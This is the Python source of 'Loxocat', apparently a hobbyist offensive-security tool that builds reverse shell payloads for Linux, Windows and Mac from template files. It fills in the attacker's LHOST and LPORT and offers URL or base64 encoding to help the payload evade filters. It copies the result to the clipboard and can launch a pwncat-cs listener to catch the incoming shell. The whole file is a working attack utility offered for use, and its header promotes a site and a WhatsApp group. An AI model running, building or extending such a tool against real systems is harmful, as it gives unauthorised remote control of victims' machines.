# 🐘 Loxocat 🐈 created by git5
# LoxoSec https://www.loxosec.rf.gd
# WhatsApp group https://chat.whatsapp.com/Iv7lplJVgM16FeuIzKhFxj

import os
import subprocess
import urllib.parse
import base64
import pyperclip

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def get_inet_info():
    eth0_info = subprocess.getoutput("ifconfig eth0 | grep 'inet '")
    wlan0_info = subprocess.getoutput("ifconfig wlan0 | grep 'inet '")
    listener_info = read_listener_info()

    print(f"{bcolors.HEADER}=== INET Information ==={bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}eth0:\n{eth0_info}{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}wlan0:\n{wlan0_info}{bcolors.ENDC}")
    print(f"{bcolors.OKCYAN}Listener: {listener_info}{bcolors.ENDC}")


def read_listener_info():
    listener_file_path = 'con/listener.txt'
    if os.path.exists(listener_file_path):
        with open(listener_file_path, 'r') as file:
            listener_info = file.read().strip()
            return listener_info
    else:
        return ""


def configure_listener_info():
    listener_file_path = 'con/listener.txt'
    listener_info = input(f"{bcolors.WARNING}Enter listener information (format: LHOST:LPORT): {bcolors.ENDC}")
    with open(listener_file_path, 'w') as file:
        file.write(listener_info)


def get_user_choice(prompt, options):
    choice = input(prompt)
    while choice not in options:
        print(f"{bcolors.FAIL}Invalid choice. Please try again.{bcolors.ENDC}")
        choice = input(prompt)
    return choice


def read_shell_options():
    shell_file_path = 'db/shell.txt'
    if os.path.exists(shell_file_path):
        with open(shell_file_path, 'r') as file:
            shells = file.read().splitlines()
            return shells
    else:
        return []


def show_reverse_shells():
    print(f"{bcolors.HEADER}=== Reverse Shells ==={bcolors.ENDC}")
    shells_dir = "db"
    os_choices = ['1', '2', '3', 'back']
    os_files = ["linux.txt", "windows.txt", "mac.txt"]

    print("1. Linux")
    print("2. Windows")
    print("3. Mac")
    print("Back")

    os_choice = get_user_choice("Select an OS option: ", os_choices)
    if os_choice == 'back':
        return
    os_file = os_files[int(os_choice) - 1]

    shells_file = os.path.join(shells_dir, os_file)

    with open(shells_file, 'r') as file:
        lines = file.readlines()

    titles = []
    for line in lines:
        if line.strip().startswith("(titulo)"):
            title = line.strip().split(" ", 1)[1]
            titles.append(title)

    for index, title in enumerate(titles, start=1):
        print(f"{bcolors.OKCYAN}{index}. {title.strip()}{bcolors.ENDC}")

    shell_choice = get_user_choice("Select a shell option: ", [str(i) for i in range(1, len(titles) + 1)])

    selected_script = lines[lines.index(f"(titulo) {titles[int(shell_choice) - 1]}\n") + 1].strip()

    shell_options = read_shell_options()
    for index, shell in enumerate(shell_options, start=1):
        print(f"{bcolors.OKCYAN}{index}. {shell}{bcolors.ENDC}")
    shell_choice = get_user_choice("Select a shell: ", [str(i) for i in range(1, len(shell_options) + 1)])
    selected_shell = shell_options[int(shell_choice) - 1]

    selected_script = selected_script.replace("(shell)", selected_shell)
    lhost = input("Enter LHOST: ")
    lport = input("Enter LPORT: ")
    selected_script = selected_script.replace("(lhost)", lhost).replace("(lport)", lport)

    encode_options = ['1', '2', '3', '4']
    print("1. None")
    print("2. URL encode")
    print("3. URL double encode")
    print("4. Base64")

    encode_choice = get_user_choice("Select an encoding option: ", encode_options)
    if encode_choice == '2':
        selected_script = urllib.parse.quote(selected_script)
    elif encode_choice == '3':
        selected_script = urllib.parse.quote_plus(selected_script)
    elif encode_choice == '4':
        selected_script = base64.b64encode(selected_script.encode()).decode()

    pyperclip.copy(selected_script)
    print(f"{bcolors.HEADER}=== Generated Reverse Shell ==={bcolors.ENDC}\n")
    print(selected_script)
    print(f"\n{bcolors.OKGREEN}Your shell script is copied to clipboard.{bcolors.ENDC}")

    listener_choice = get_user_choice("Do you want to start the listener? (y/n): ", ['y', 'n'])
    if listener_choice == 'y':
        listener_info = read_listener_info()
        if listener_info:
            listener_command = f"pwncat-cs {listener_info}"
            subprocess.call(listener_command, shell=True)
        else:
            print(f"{bcolors.FAIL}Listener information not found. Please configure the listener.{bcolors.ENDC}")


def main():
    print(f"{bcolors.HEADER}=== 🐘 Loxocat 🐈 ==={bcolors.ENDC}")
    while True:
        get_inet_info()
        print(f"{bcolors.HEADER}=== Main Menu ==={bcolors.ENDC}")
        print("1. Configure listener")
        print("2. Generate reverse shell")
        print("3. Exit")

        options = ['1', '2', '3']
        choice = get_user_choice("Select an option: ", options)
        if choice == '1':
            configure_listener_info()
        elif choice == '2':
            show_reverse_shells()
        elif choice == '3':
            print(f"{bcolors.OKGREEN}Exiting...{bcolors.ENDC}")
            break


if __name__ == "__main__":
    main()
